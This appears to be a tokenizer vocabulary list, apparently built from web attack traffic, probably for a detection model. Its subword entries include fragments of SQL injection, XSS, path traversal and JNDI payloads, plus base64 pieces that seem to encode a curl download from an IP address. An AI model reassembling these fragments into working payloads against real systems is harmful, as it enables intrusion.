[PAD]
[UNK]
[CLS]
[SEP]
[MASK]
[UNK0]
[UNK1]
[UNK2]
[UNK3]
[UNK4]
[UNK5]
[UNK6]
[UNK7]
[UNK8]
[UNK9]
[unused0]
[unused1]
[unused2]
[unused3]
[unused4]
[unused5]
[unused6]
[unused7]
[unused8]
[unused9]
[unused10]
[unused11]
[unused12]
[unused13]
[unused14]
[unused15]
[unused16]
[unused17]
[unused18]
[unused19]
[unused20]
[unused21]
[unused22]
[unused23]
[unused24]
[unused25]
[unused26]
[unused27]
[unused28]
[unused29]
[unused30]
[unused31]
[unused32]
[unused33]
[unused34]
[unused35]
[unused36]
[unused37]
[unused38]
[unused39]
[unused40]
[unused41]
[unused42]
[unused43]
[unused44]
[unused45]
[unused46]
[unused47]
[unused48]
[unused49]
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
0
1
2
3
4
5
6
7
8
9
:
;
<
=
>
?
@
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
[
\
]
^
_
`
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
{
|
}
~
¡
¢
£
¤
§
©
ª
¬
°
²
³
´
µ
¶
·
¸
¹
»
¼
¾
ê
ë
ì
í
ï
ž
ϱ
ݵ
‘
’
“
”
…
⋆
⌐
◕
当
간
건
검
결
고
공
과
국
그
근
기
년
녕
뉴
는
다
대
데
도
드
램
력
로
료
를
리
마
만
멘
문
미
민
본
색
서
선
성
세
술
스
신
쓰
아
안
양
어
얼
업
여
영
예
왜
요
울
원
의
이
입
있
잠
정
조
종
주
지
초
최
출
케
켓
큐
터
테
트
팸
페
프
하
한
항
해
홈
화
회
＇
##7
##4
##F
##S
##Y
##I
##B
##M
##i
##n
##t
##5
##9
##q
##l
##P
##X
##w
##3
##8
##W
##6
##h
##j
##a
##u
##k
##f
##s
##0
##g
##e
##z
##y
##1
##2
##p
##x
##o
##v
##K
##b
##U
##L
##Z
##H
##r
##R
##Q
##m
##A
##D
##E
##T
##c
##d
##N
##C
##O
##G
##V
##J
##술
##주
##간
##출
##년
##도
##이
##스
##기
##는
##³
##µ
##ê
##¸
##료
##로
##그
##램
##데
##°
##페
##지
##력
##해
##세
##요
##색
##어
##를
##녕
##하
##ï
##¼
##종
##¬
##ì
##고
##항
##¢
##한
##민
##국
##예
##원
##²
##울
##아
##트
##마
##켓
##ë
##©
##¾
##ª
##입
##회
##문
##양
##과
##£
##´
##만
##테
##뉴
##얼
##최
##정
##건
##ݵ
##초
##다
##큐
##멘
##터
##리
##영
##화
##있
##드
##ta
##ck
##tack
##ttack
Attack
CH
##ti
##on
##tion
CHR
##ction
##ab
##el
##pe
##ype
##yn
##tax
##yntax
##abel
Type
Label
Syntax
##ri
In
##je
##jection
Injection
##ND
##st
##QL
SQL
##rt
##rip
##crip
##hp
php
11
in
##wa
dv
dvwa
##LE
##ru
##ctions
inst
##ructions
instructions
SE
##CT
AND
##LECT
SELECT
##le
##te
##AR
##ss
CHAR
45
113
##ro
12
##SE
ht
##SS
##tp
po
http
##ng
port
##HE
10
##cript
##00
XSS
##er
do
##ite
##39
##33
##ting
##ross
Cross
Site
Scrip
Scripting
ip
##ar
##lert
doc
##HEN
alert
script
0x
120
OR
##71
##LL
##RO
80
##31
EL
##ON
##ROM
FROM
ch
##37
##34
##36
##35
CA
NU
##38
81
##nd
##ma
##30
##av
##ec
char
as
98
ELSE
END
NULL
THEN
CASE
WHEN
##2e
##in
AS
##al
##ers
##3135
##3433
0x39
##3738
##363135
##343330
0x39363135
##3738343330
0x393631353738343330
##2e39
##or
49
##62
##de
##sT
106
CO
cA
cAsT
##KE
##ION
##at
##AT
##us
122
##ER
on
sy
##ST
##ql
##mp
##map
sql
##AL
##ecu
sqlmap
##me
sys
##IKE
##ge
##0000
##NT
##76
UN
UNION
##ty
CON
pa
0x71
##6a
107
LIKE
or
40
##as
ALL
##UAL
DUAL
Tr
##avers
##aversal
Traversal
##RE
##ode
##ath
48
##ch
##mo
##99
##ble
##lo
Path
##42
##es
##32
##7a
##YS
##CAT
CONCAT
##EP
##78
##UNT
##95
te
jav
##11
se
##ad
ELT
de
##DE
##ssi
GE
##nt
##CE
##rc
WHE
WHERE
##li
##ascript
##an
PD
##44
secu
securi
imp
COUNT
security
impo
PDF
##RI
SLE
SLEEP
and
dev
javascript
GET
50
Re
##re
##ssible
##6b
impossible
##ame
Ex
src
##70
org
##65
con
##et
0x39363135373834333031
##72
118
##ou
CODE
##61
20
##tc
##64
##SER
##BM
##users
sysusers
USER
##arch
USERS
##OR
##for
##12
etc
52
##wd
##40
##ul
##ce
SYS
pass
Code
fi
##mote
Remote
##ID
112
##ect
IN
search
test
54
##ecution
51
##51
##mg
##90
##ew
##xt
Execution
##96
img
passwd
##IN
##gi
88
##28
##om
##HP
##68
##load
55
RCE
BY
##MA
77
PHP
id
##ner
##min
CAST
ad
50000
90
##di
##ap
HT
62
##IC
##ML
##ue
##14
##ow
75
NUM
##SESS
##TP
##ERIC
NUMERIC
##it
##abi
##92
65
72
vi
##6271
HTTP
##75
##ror
##ulner
IS
##74
60
15
re
##94
22
##ml
68
PHPSESS
PHPSESSID
RA
66
chr
##un
ap
##pt
##QU
##IT
##AB
##98
##6f
3E
83
##error
##id
##KO
admin
18
##ls
onerror
84
EX
##ot
78
24
to
70
vulner
89
##10
58
iKO
85
0x716a
nan
##eb
##ra
##18
##LO
##abili
56
##ndi
67
##67
##able
99
RE
page
##7a71
conte
##54
pro
##IBM
97
##60
SYSIBM
87
##pl
##dap
jndi
vulnerabili
li
ldap
sel
UP
RAND
14
bo
sh
##ties
##ut
vulnerabilities
SC
##LES
Tab
##ser
##ost
##ver
##EX
SET
##Op
##ABLES
82
SY
##og
SYST
##ter
wp
##zp
69
##ars
##6a71
nv
##Opzp
nvOpzp
tmp
##la
##zi
ma
##79
##FOR
##use
##PE
##ind
111
##ard
sty
style
file
##AG
29
select
##ct
di
##que
ar
##3s
102
74
##st4
spl
##u39
##ufor
##1ls
##4295
##ou1ls
##gi4295
##3sgi4295
##st4ou1ls
spl3sgi4295
##u39ufor
##st4ou1lsu39ufor
spl3sgi4295st4ou1lsu39ufor
##rom
SYSTABLES
19
42
##OST
T3
T1
T2
##TX
##50
##cce
##rs
onmo
##TH
from
asp
86
##DER
##indow
##SX
##ic
##script
114
ORDER
CTX
SN
##SYS
##52
DRI
XML
##THSX
DRITHSX
CTXSYS
108
110
co
me
onmouse
##se
##BMS
28
53
DBMS
##quest
be
th
##age
64
0x717a
##ion
##get
##58
57
##DD
##66
##am
##ate
##pp
##6c
38
71
##PER
##dex
UPPER
32
get
##ory
##776
2F
200
5000000
##omma
79
##IV
MA
104
##ommand
Mo
MAKE
Th
x71
##UP
##d5
##6b7a71
0x716a62
##On
0x716a626271
##io
##EF
##6b71
an
view
board
##59
109
103
GRO
ME
GROUP
0x7162
##77
##ir
text
44
##md
##ACT
ini
##322e39
##indows
log
##55
##69
index
code
FLO
FLOOR
##PT
##TR
js
##53
##od
ex
nd
##ious
Command
##ke
##6f6
##over
##ment
76
PG
Mozi
##93
101
##96e
xml
##ing
##yload
##ATION
IF
##ang
##up
##OT
##DB
##El
name
##73
##cl
119
##AGE
PI
en
##is
##5c
payload
##Ni
##332e39
21
##UE
100
##63
##cT
##CH
fun
table
win
##lL
##NG
##SSAGE
##000
##CEIV
RECEIV
MESSAGE
PIPE
RECEIVE
##ast
RDB
##table
121
##ALUE
500000000
uNi
##ccept
##icious
##776e
uNiOn
sEl
##EcT
0x6c
sElEcT
3C
wget
##VALUE
##ACTVALUE
##TRACTVALUE
95
##oc
##cR
##7696e
##70776e
EXTRACTVALUE
##6f67696e
0x6c6f67696e
##70776e7a
0x6c6f67696e70776e7a
BIT
##07
##LIKE
116
main
##nte
AlL
RLIKE
##rl
##342e39
searchC
##ditable
contente
onmouseover
contenteditable
##ile
##Name
91
##RING
115
##cRi
46
new
##STRING
cat
73
DE
Dir
##mation
##NDI
117
##ectory
##ation
SCHE
host
##fr
##370
0x393631353738343330312e39
Directory
appe
2e
92
JNDI
user
web
##VER
par
u00
POST
no
##08
##999
##TE
##FORM
UT
cmd
##gg
##pon
##6a6a71
INFORM
SCHEMA
INFORMATION
Accept
##05
##ff
105
##RIPT
BE
DO
##FB
##ell
login
94
##che
windows
##ex
CONTE
##ase
##786271
CONTENT
##LA
0x716b
lang
ST
##362e39
##6a6b7a71
x716a6b7a71
searchCnd
appears
0x716b786271
30
rm
##ve
16
27
36
##LU
##ument
##17
##16
##97
##INS
T4
##be
x5c
NOT
rf
##20
##val
##56
##13
##AP
##frame
tru
##ata
arrs
document
0x393631353738343330322e39
st
##mage
vars
##Type
##372e39
##ps
##D5
true
CONVER
CONVERT
##BR
##MAR
##alert
##co
##NCH
##CO
##610
BENCH
##MARK
BENCHMARK
TO
mal
##88
DOMA
action
##911
61
##80
0x393631353738343330332e39
13
MD5
##MB
##ep
malicious
WA
800
##DU
SCRIPT
XMLType
##9551
##4407
##3709551
##44073709551
oast
##vg
##ring
##all
div
SU
not
##382e39
##DDR
0x716276
##44073709551610
17
image
##91
##cat
app
le
res
##ur
##pc
0x393631353738343330342e39
via
##ITFOR
WAITFOR
for
##sh
##25
##ok
##du
0x78
DELA
DELAY
is
##YLE
##ere
col
STYLE
##ig
##ger
##29
34
##il
request
SUB
net
##23
##formation
App
data
##352e39
onload
200911
##FG
##lp
##en
##OW
##ink
31
##6744073709551610
cid
iframe
##gq
##HT
##No
0x393631353738343330352e39
AB
##St
##pa
##392e39
un
##put
##RC
param
0x7162766a71
svg
##plo
126
Request
##ponse
INT
com
##47
##Pt
##em
##tain
##ATE
PLU
md5
##83
##ead
##GINS
0x717a6a6a71
hostName
PLUGINS
832
sc
xss
47
T5
cd
0x393631353738343330362e39
onbe
##gent
##cRiPt
arrs2
File
##ie
##EC
##766b71
contain
produ
product
bin
##lla
##wor
##can
0x717a766b71
onbefor
val
##ADDR
##cli
##cation
INADDR
UTL
ABC
ScRiPt
##LOB
96
Con
html
25
999
ADD
Agent
xp
##OMB
##RESS
java
##DEFG
RANDOMB
ABCDEFG
ADDRESS
RANDOMBLOB
En
HOST
REP
eval
##nj
##82
##op
##NEF
Mozilla
##ploit
HEX
##85
##ude
##19
##dl
0x393631353738343330372e39
SRC
##302e39
##ref
##ourc
of
##ub
##tima
EXEC
This
##clude
DOMAIN
For
ja
##46
##3a
##UU
set
##ress
##q8
##vi
##eth
##289
672
ond
##4e
##DAT
Exploit
##gitima
legitima
##ethod
legitimate
No
User
information
include
St
ke
##NER
0x28
##ding
41
Web
dra
jlp
##41
##3q8
##2f
##ES
##cgq
does
##medl
seq
content
##rscgq
##ppf
##d56f
##coding
##njmedl
jlpd56f
##3q8njmedl
##3q8njmedlrscgq
35
844
sche
##ndex
0x393631353738343330382e39
##es3q8njmedlrscgq
##COUNT
##ppfes3q8njmedlrscgq
jlpd56fppfes3q8njmedlrscgq
schema
BIN
al
url
##bb
##rite
SERI
##ARY
GENER
The
IFS
##ource
BINARY
SERIES
GENERATE
Host
##nu
##0F
BITSTRING
BITCOUNT
##BS
##gs
##mb
any
tables
##shell
qu
##ws
##86
##RF
##312e39
3Ealert
list
3Cscript
cmdshell
8446744073709551610
##ac
##gear
##lication
netgear
39
kr
##wn
##ww
##si
##NCT
##ject
0x393631353738343330392e39
the
2Fscript
##EAT
777
REG
ope
qj
##YPE
##22
##334
##EXP
SUBSTRING
REPEAT
REGEXP
ROW
attack
##ne
##84
##81
537
uff
write
##usion
##mod
value
##fa
##ING
UPDAT
##EXML
UPDATEXML
BO
lt
type
##89
##DR
##mpt
sys7
sys4
sys5
sys3
sys6
sys1
sys2
##7862
##ssion
##out
read
##okie
call
gt
tr
##ho
##24
0x716262
##click
href
##MG
##ase64
59
hav
source
##PC
chmod
##STER
SYSMA
Note
having
SYSMASTER
KE
LD
##na
##bo
##Ch
0x39363135373834333031302e39
jsp
##clusion
##ocus
##78626b71
0x7162627a71
FU
##57
##focus
##NS
Inclusion
##main
function
AN
ut
##th
##PAG
##21
##pg
##HDR
##rute
func
response
union
LDAP
##PAGHDR
135
brute
sta
SYSPAGHDR
0x716a6b7a71
##pass
String
##NCTION
FUNCTION
Ge
cate
##leep
##ine
##omcat
prompt
color
##45
##15
##AN
##Code
##386
exec
sleep
www
##By
##006
domain
memb
IMG
method
##ns
##os
##bject
int
##657
conf
##ray
##Id
##26
##Ad
0x39363135373834333031312e39
jaws
312
314
790
TYPE
##MMA
##der
##cko
##397
##ersion
COMMA
##zip
##ggable
draggable
cgi
gzip
it
up
wh
##kF
##09
##gin
onclick
Gecko
AD
xs
##zq
##oo
##112
array
##ccess
##sition
218
FI
MO
##BQ
Tomcat
scRi
tabi
##48
##IG
##At
##EB
##OLE
down
##eader
setup
MODE
scRipt
tabindex
144
299
mi
tit
##HR
##mu
##389
Encoding
BOOLE
##Bypass
TomcatBypass
BOOLEAN
26
5334
PRO
aut
##YSE
##ist
##jc
##gr
##ALYSE
##CEDU
0x39363135373834333031322e39
add
##own
7540
##gery
Forgery
download
PROCEDU
PROCEDURE
It
mps
##6e
##ja
##HA
input
INF
EXP
ANALYSE
mpsl
##uc
##set
##rpc
##ded
##1111
##ull
cookie
xmlrpc
ondra
member
242
WEB
##SRF
##sers
##stem
123
##40e
6205
80040e
Ch
cur
##MY
##ll
##sta
##01
##gro
##let
##ssage
##ator
999999
quot
5657
834
syntax
txt
##hu
##uage
##003
##ream
##402
ER
JS
jpg
##ol
##EM
##tice
##ore
like
80040e14
142
vti
##43
##tle
##QV
##text
##ROR
##302
##ansition
0x39363135373834333031332e39
##149
##FBY
##word
##Char
vtitle
662
Windows
hel
pri
rec
##ISE
##name
##aUU
##gory
##po
##bC
##AA
##421
##ression
7262
ERROR
611
RPC
version
x2e
##BT
##ime
##nQ
##jQ
##ure
##erver
RAISE
notice
uff1
JSON
190
##ack
##fo
##03
##756
1965
##Stream
260
DAT
cs
loc
##MMY
##362
##624
system
##ound
2010
##120
SYSDU
lib
menu
##key
##MMY1
SYSDUMMY1
amp
sus
##My
##end
##picious
##vo
##UF
##rf
0x39363135373834333032
##708
0x39363135373834333031342e39
##646
##405
fromChar
800a
mips
help
suspicious
fromCharCode
4386
737
US
cf
null
##imation
##wO
##87
##ASE
##ava
6268
9159
332
634
Base64
Java
by
du
##ME
##XJ
##ht
##CB
##ont
0x4
##617
##613
##101
context
##000d
print
800a000d
NT
Scan
ac
##ache
phpun
##erv
##111
##rea
5544
##ITY
form
##opy
##nection
##Admin
address
phpunit
RIG
##ster
##409
##ABASE
4635
category
##AtZ
RIGHT
131
272
2999
37
4112
678
##In
##MT
##jav
##ext
##rator
##CL
##384
onkey
##lose
##ith
##work
2995
auto
DATABASE
##javascript
251
css
##jq
##gn
##bl
##AV
##tent
##ecopy
##int
##943
8558
##183
##late
onbeforecopy
utf
3145
##bCAtZ
134
210
2289
XX
but
foo
x3
##nal
##Web
##fun
##ent
##RQ
##do
##dC
##Vy
##ele
##pear
invo
##rome
##archar
##QUJ
6779
exp
##HTML
scr
xspear
title
##function
invoke
4402
700
pl
varchar
x61
##vb
##RY
##dy
0x5c
##34f
201
##ptSt
that
application
##putStream
8329
1354
recptSt
##MyAdmin
invokefunction
359
Vulner
go
hu
pre
##Wri
##02
##rst
##RL
12ho
##31352e39
0x39363135373834333031352e39
master
getWri
4472
env
##grab
12home
getWriter
3362
5397
io
zgrab
##iz
##27
##ZG
##¬¸
##ARE
##ARCH
404
##684
7297
1024
3880
DECL
6721
open
##jax
DECLARE
196
2f
cu
close
mode
oN
sn
xm
##544
##3Q
##xb
##bs
##LD
4552
##374
CALL
##ount
##126
5695
dis
##APB
scode
key
##bbq
175
23
935
ajax
if
var
##IL
##ay
##uz
##Res
##Access
##til
order
4017
##ling
##rent
##QUM
1850
6114
6347
CSRF
C120
Sa
base
ro
##49
##Mo
##jB
##mm
##dF
##date
##365
##303a
##403
first
red
apos
5883
##54e
3234
##rlpc
##3020000
dual
##ervlet
xmrlpc
C1203020000
765
HAV
aND
cla
sub
##ip
##ui
##cc
##Con
##tity
phpMyAdmin
##atch
0x7178626b71
##logs
9082
config
upload
autofocus
huhu
HAVING
1943
33
4646
532
6613
Ht
URL
back
ct
ech
site
window
with
##kzq
##Kit
##df
##rop
##arget
##9999
##QUh
body
2937
think
##odHR
news
Application
KEYS
Chrome
USING
##wOi
utf8
3597
echo
##odHRwOi
168
252
742
KHTML
target
##FFBY
##F403
##Scan
##BY
##Md
##und
##vate
##Users
##cu
##down
##CK
##tic
##leWeb
##SET
pop
1012
118F403
password
boot
AppScan
AppleWeb
Connection
##BSFFBY
118F403006
AppleWebKit
212
350
860
9421
at
##FNEF
##and
##04
##HNEF
##Reader
scripts
##766
##7a6a6a71
0x39363135373834333031362e39
8847
8792
x717a6a6a71
qjbbq
qjkzq
##aUUI
2720
expression
##FNEFaUUI
8405
Object
use
##lj
##ld
##WN
##za
##tivate
4571
##368
ont
onc
4095
1585
##983
provi
8771
##ternal
x7178626b71
9551
params
##activate
methodName
##ground
background
00
211
4003
Smu
gpon
so
##Ipt
##Page
##ku
##s2
##cn
https
##LLATION
COLLATION
##ash
tex
import
##705
concat
##282
administ
self
##ggling
##fari
KEY
##board
##HAS
scrIpt
Safari
provided
Smuggling
gpon80
COLLATIONS
administrator
0000
798
CRY
LEF
cast
fr
op
pwd
qk
sk
##Blogs
##if
##fer
##ZBR
##RQU
##rigin
SQLID
SQLHAS
8066
8136
4077
##ameter
External
8873
8965
4208
getUsers
##08p
UTIL
Entity
AD7
1446
##ssages
7377
XXE
##Response
CRYPT
LEFT
SQLHASH
getUsersBlogs
UTILITY
192
GT
TABLES
cG
¼ì
##Be
##ys
##UR
##ELD
##Time
##Vi
##one
##337
onfocus
##ult
9974
1912
##4e544
FUNCTIONS
TYPES
FIELD
0x434f
firstTime
texta
¼ì²
FIELDS
295
63
637
AC
Found
New
Not
Sh
per
su
xx
##BW
##MNS
##8v
##ag
##fH
##eri
##path
##Lj
##Rl
##EQU
##dr
##Ny
##Vg
injection
492
COLU
##IONID
5414
2451
1022
6413
parameter
string
DOMAINS
SUBSET
##start
##54e54
##4e54454e54
0x434f4e54454e54
COLUMNS
399
3183
POR
head
rv
##Iuc
##tu
##ux
##zA
##zO
##vc
##bi
##Le
##ms
##dG
##low
##list
##656
0x39363135373834333031372e39
5495
##dir
##927
8934
ondrag
current
8348
2606
##odHRwOi8v
GTID
textarea
492126
PORT
00000
3101
8999
aa
em
mt
object
server
vend
xwork
##IE
##udi
##eR
##Line
##mit
0x7
##mal
##ave
onMo
##messages
sysmessages
def
8836
##673
9912
6913
##OTE
language
Content
3124
where
##dCc
NewLine
vendor
##udio
onMouse
231
244
3c
965
9389
9111
bl
man
qna
##qu
##W5
##kel
##patch
##ry
##rror
##Ro
##AD
##Ck
##ony
##ript
8053
##NTT
##763
##648
fil
9099
SYSTEM
##value
arrs1
6722
contents
7902
6789
dispatch
popup
##kely
633
6149
8368
Cint
LO
lid
êµ
##nce
##nNTT
##XV
##wN
##3Vy
##zj
##xnQ
##EST
##CM
##Cd
##¬ë
##time
CHARACT
##mana
9835
##7878
0x39363135373834333031382e39
5230
##cess
884
7734
7533
##SESSIONID
1512
##QUxnQ
likely
SETS
meta
6166
confir
##bCAtZnNTT
option
dispatcher
êµ¬ë
CHARACTER
##manager
##bCAtZnNTTCB
êµ¬ë¬¸
161
3e
375
4000
635
Bu
KC
NV
eng
font
next
##FC
##IF
##kq
##rr
##ransition
##AME
##Call
##Gd
htm
##are
##35a
##383
##rep
const
##746
##984
243
5000000000
u003
9488
onbefore
##UUF
transition
methodCall
7909
6626
csrf
ontransition
confirm
Lang
base64
ca
x86
##YX
##ide
##5a
##Xv
##ugin
##pBQ
##ZXJ
##cs
##din
##Vs
4963
##7671
##727
6271
6638
vulnerable
live
this
stdin
4790
includes
alter
##kFD
2427
uff1e
uff1c
1903
Vulnerable
curl
Language
171
233
354
990
Co
fuz
hm
kboard
mb
ob
ph
uri
##4b
##im
##ton
##so
##06
##ed
##zele
##ylj
##UFB
##mx
##DA
##CRIPT
##OU
##ery
8167
onan
##live
2062
##form
6577
6090
6025
##terfa
6453
There
##ment1
##vent
start
plugin
##ARCHAR
8608
selfrep
8846744073709551610
fuzzele
##yljne
onanimation
##terface
fuzzelement1
169
1389
412
MS
Nam
Y3Vy
blo
mod
pla
##Index
##tro
##Wx
##ager
##y9
##vZG
##ba
##c2
##cmd
##Cript
Interface
##ary
##626
##769
4053
##asCript
##787
##658
##721
fig
9016
##untime
##QUR
8932
pageIndex
##663
getIn
##COM
1300
8320
kef
##2f31
AD4
##port
Scanner
2516
1758
skyljne
deflate
NVARCHAR
Naming
getInputStream
250
3289
674
7149
Util
audio
drop
qb
##File
##qq
##ly
##ari
##um
##g08p
##2gg
##ox
##ZD
##Tp
##cate
##db
##Over
##ells
intc
1241
##395
##arc
##364
##mail
##ans
2092
##SERVER
##9090
redir
2298
##oto
8742
2942
animation
username
3034
##bed
##frames
images
##cliCk
all
opens
cfg
categoryCOM
oNcliCk
##ferer
##View
##Iuc2gg
9654
KCSESSIONID
plugins
intcNo
##Iuc2ggfH
3927
651
918
Acc
LR
QU
br
cOn
fRo
put
xo
##Fi
##Y2
##Mj
##644
##hony
##uy
##fe
##ear
##ymp
##A0
##OX
indi
##row
8161
syscmd
0x39363135373834333031392e39
9092
##75a
6670
##uns2
todo
5611
filename
encoding
5972
##setting
curpath
root
class
5323
cG93
Shell
currentsetting
onMouseOver
##zjjq
redirect
opensymp
fRoM
opensymphony
01
2A
262
328
562
5409
692
795
712
9708
Dis
label
mo
mar
qzjjq
ret
wor
x28
##Se
##MjQ
##ln
##Pro
##aW
##ki
##kn
##fig
##pd
##oad
##br
##LT
##rQ
##rE
##cd
##GB
Information
inad
##333
##311
##379
##NTku
4090
seem
2025
6093
##ogin
4252
message
2006
9695
jaV
utl
3129
##jcwN
memberAccess
location
1313
##MTcu
1349
button
##xbq
##ticle
parameters
##zAvZG
##zOjcwN
LOCK
##MjQzOjcwN
inaddr
##NTkuNy
##MTcuMjQzOjcwN
##MTcuMjQzOjcwNzAvZG
02
236
261
636
751
DRO
TEX
Up
fl
here
mnt
pn
sp
uid
users
ver
wel
x51
x29
##4c
##Ii
##MZ
##lR
##PS
##ud
##file
##py
##pb
##vas
##KT
##QQ
##VeR
127
##388
##los
##655
5439
7793
##948
6605
8508
shell
article
4498
##aste
FILE
##group
##gnl
1966
##Context
qkxbq
6376
ACJ
xwork2
##bCAtZnNTTCBodHRwOi8v
AD4APB
Account
cOnVeR
cG93ZXJ
Disc
DROP
TEXT
welf
cOnVeRt
0a
172
151
5c
8397
DEF
JO
VBS
cg
cache
ha
nor
pi
rp
tra
time
wid
xE
x72
x74
##IH
##Bu
##nD
##Xh
##hc
##fn
##sg
##2d
##Ha
##d6a
##hpage
##lection
0x23
##move
searc
##123
5255
5130
HTML
7589
##945
shells
die
##ffere
Config
##view
drag
##ored
3321
onkeydown
7425
3506
##EQUF
mtd
6335
MSGB
##trol
LRXv
jaVasCript
JOIN
normal
searchpage
MSGBOX
2384
3006
500
575
598
630
896
ACT
AA0
ID
WOW
command
dl
del
gen
hid
lM
mat
oc
rk
x76
xls
x69
x73
x63
##4d
##SB
##Servlet
##lf
##XB
##Xta
##gd
##vv
##vious
##by
##rh
##rded
##Dx
##ESERVER
##cy
##NjQ
##Ce
##GN
##eld
##rig
Index
1164
##warded
##tpServlet
0x2e
0x303a
##381
##inux
##mplate
##ould
##643
5437
##xtra
7756
6853
9236
##BRV
ondrage
2428
local
0x39363135373834333032302e39
println
7659
HttpServlet
ctl
##zaG
headers
photo
Y3VybCAtZnNTTCBodHRwOi8v
##g08p0
##losure
Disclosure
VBSCRIPT
AA0APB
WOW64
0x303a303a
##xtract
HttpServletResponse
0D
130
160
234
390
431
671
614
6763
842
868
978
968
SSRF
Server
Side
Win
ab
alive
bbs
extract
h1
pdf
x70
##Yle
##lJ
##WFB
##hx
##kk
##272
##QjB
##mc
##Error
##NkFD
##OEF
##GL
InputStream
1234
8147
##info
##ush
##EREM
##ecut
##426
##7871
5094
##96f
##741
7094
limit
dir
diag
1910
8678
7193
winnt
9568
stYle
onbeforecut
update
##olu
1425
##75644
keyframes
frame
3998
##tuf
aaa
manager
##IFN
obvious
seems
Upload
flush
##NjQWFB
ctl05
0x303a303a35
extractvalue
##QjBBSFFBY
##NkFDOEF
##EREMOTE
##NjQWFBQjBBSFFBY
##NkFDOEFMd
178
140
278
337
4766
4673
7708
831
928
960
9383
ADDR
Pro
Xo
act
ci
ck
event
email
fw
gop
ta
x6a
x64
##4y
##435
##FI
##Script
##IUUF
##iQUJ
##type
##tRQ
##lFB
##line
##lFC
##XdCc
##wQV
##wQUM
##3b
##jg
##akF
##uY
##ule
##kZBR
##ft
##sy
##go
##zQUM
##yx
##yd
##vV
##vQU
##UQUh
##mf
##AS
##Ex
##TUR
##cel
##dUF
##dReader
##NV
##GIN
##Vl
##JQUJ
##342
##36f
##3676
##385
8120
##ndCM
##ecute
##menu
##760
##954
teXta
template
##641
5233
5228
5417
5497
##aption
##747
##mlBR
apache
245
0x716a71
##ration
RETUR
2918
##EFHNEF
4466
4419
##mdBS
4600
appear
u0061
BEGIN
keep
##QVpBQ
##FBYndCM
##aUUJ
3327
##RQkZBR
##jBBR
##dFQVpBQ
##HNEFiQUJ
##FNEFaUUIwQUM
##FNEFaUUIzQUM
##RQUtRQ
##BWXdCc
##XVBRV
Buffere
##UFBb
##mxBR
##Iuc2ggfHNo
##rQWN
##rEa
##lRBSFFBY
welfare
lMxt
Win64
InputStreamReader
##IUUFJQUJ
##lFBdUF
##lFCakF
##wQVR
##vQUNjQWFBQjBBSFFBY
##UQUhrQWN
teXtarEa
##EFHNEFad
##mdBSUFBb
##RQkZBRmdBSUFBb
##dFQVpBQlRBSFFBY
##FNEFaUUIzQUMwQVR
##RQUtRQXVBRV
BufferedReader
##IUUFJQUJUQUhrQWN
##lFBdUFFNEFaUUIwQUM
##lFCakFIUUFJQUJUQUhrQWN
##RQUtRQXVBRVFBYndCM
132
235
43
432
460
7663
930
And
CRE
Linux
NDx
Se
Un
XOR
brow
ko
##MD
##tus
##9jc
##lite
##hs
##hr
##aw
##sM
##scn
##zR
##press
##xor
##bile
##Zy
##HH
##Rf
##TA
##da
##d64
##ons
##ontext
1152
##396
##deo
##deactivate
##esh
##admin
##RICT
Referer
##dit
##94c
1877
##ability
##5459
proc
show
files
##quee
4294
aspx
onmouseout
STRICT
##ilder
4772
allow
query
try
colors
titLe
8341
libc
menuNo
##BYlFBdUFFNEFaUUIwQUM
embed
##cessBu
onbeforedeactivate
##VsbCAtZ
3545
Cookie
block
plain
6518
marquee
##NTkuNy4y
##MTcuMjQzOjcwNzAvZG9jc
track
genxor
##zaGVsbCAtZ
##IFNRQkZBRmdBSUFBb
ProcessBu
ckers
RETURNS
CREATE
browser
##NTkuNy4yMTcuMjQzOjcwNzAvZG9jc
ProcessBuilder
198
290
255
531
668
7289
AnD
Loc
Ma
area
bgs
bash
cj
count
link
none
rand
x0
xmp
##Bg
##ich
##q7
##Path
##3J
##ks
##f6
##0E
##zh
##zrs
##px
##ort
##bh
##bu
##List
##Load
##ZW
##my
##DY
##code
##dg
##Gy
##GU
##VS
##pet
##pec
phpinfo
SEARCH
1290
##3746
##355
##3536
##625
##620
##424
impolite
##659
##4092
##4091
##969
7537
video
2290
##QUEST
2493
arm
281
3211
catch
##LACE
REPLACE
status
which
x3cs
7009
2014092
Vulnerability
snip
URLs
oncut
oncontext
2316
##y9scn
##ansform
xorigin
##96f6e
gopage
##NTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scn
bgsound
##374696f6e
##409192
2014092409192
snippet
oncontextmenu
0A
0d
199
254
728
914
992
952
9624
Des
Fi
Te
bus
cmm
iR
path
sVg
util
x5
x80
##7C
##Ij
##Method
##ib
##nter
##tM
##5s
##wL
##3c
##jx
##fi
##0c
##vf
##HJ
##rD
##res
##Re
##mF
##Th
##TZBR
##cp
##JP
##per
##rty
##332
##360
##387
9829
##aliz
onbl
##765
##7662
0x7176
0x7170
##6a644
##706
202
##649
7775
6044
6088
repl
refr
185
8600
##EFE
META
logout
##ange
collection
##enu
##pace
##cancel
9999999
##HAccept
##11111111
1422
csp
x3e
7008
20100
##374948
9350
classi
##BeEFE
##erializ
filter
##QUxnQT
##OUEP
module
6748
categoryCOM0
6921
6367
7519
##EQUFMd
##GNBT
NDxo
##zrsOUEP
Deserializ
onblur
refresh
Deserialization
177
232
258
371
372
6648
711
7721
8000
995
Base
ENT
EQU
Tri
dfn
fre
header
map
now
pt
ping
pub
sa
would
##7S
##FF
##MC
##qk
##uo
##site
##sting
##sit
##gy
##ee
##KP
##bd
##User
##RPC
##RAME
##mV
##AU
##ci
##Vq
##rid
inc
insta
10s
0x68
9855
4854
##955
##6476
5469
##6870
5579
##dia
##ids
180
7894
7818
2456
7051
REQUEST
listing
4254
XMLRPC
bean
getR
443
xmlns
1002
9162
website
UTF
##enter
##refox
Stored
xsl
6620
0x39363135373834333032312e39
JavaScript
6781
onkeyup
2125
used
6371
xE2
XoR
##pecif
iR7S
ENTITY
EQUIV
iR7SzrsOUEP
165
1766
237
228
268
214
344
3983
477
572
568
618
6984
731
732
871
830
93
971
931
9282
SM
gif
lu
mul
pe
pid
qty
rt
specif
year
ysy
ë¬¸
##7374
##WJ
##aM
##fy
##font
##0n
##zZ
##zd
##zG
##1V
##2a
##pO
##vM
##KD
##b3
##Lm
##Login
##Zn
##HY
##Hj
##m8
##TQ
##CD
##GQ
##Jz
##tal
##pen
##CTYPE
##lei
##lement
4581
